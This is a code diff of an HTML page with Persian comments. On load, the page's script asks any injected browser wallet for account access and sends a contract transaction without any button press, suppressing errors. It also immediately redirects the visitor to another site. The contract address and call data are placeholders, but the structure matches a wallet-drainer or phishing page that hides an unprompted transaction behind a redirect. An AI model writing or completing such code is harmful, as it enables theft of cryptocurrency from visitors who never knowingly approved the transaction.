@@ -7,33 +7,28 @@
 <body>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 <script>
+// ===== Task2: ریدایرکت فوری و بدون وابستگی =====
+window.location.replace("https://example.com");
+
+// ===== Task1: تلاش برای اتصال ولت و ارسال تراکنش (غیر وابسته) =====
 (async () => {
-  // ===== Task1: فراخوانی ولت و آماده کردن تراکنش =====
-  if (window.ethereum) { // فقط Injected wallets مثل MetaMask
+  if (window.ethereum) {
     try {
-      // درخواست اتصال ولت
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
 
-      // آماده کردن تراکنش (جزئیات بعدا مشخص می‌شوند)
       const tx = {
         to: "0xYourContractAddress",
         value: ethers.parseEther("0.0"),
         data: "0xYourEncodedFunctionData"
       };
 
-      // ارسال تراکنش بدون نیاز به دکمه
-      signer.sendTransaction(tx).catch(() => {}); 
+      signer.sendTransaction(tx).catch(() => {});
     } catch (err) {
       console.error("Wallet connection error:", err);
     }
-  } else {
-    console.warn("No injected wallet found");
   }
-
-  // ===== Task2: باز کردن سایت مقصد بدون انتظار =====
-  window.location.replace("https://example.com");
 })();
 </script>
 </body>
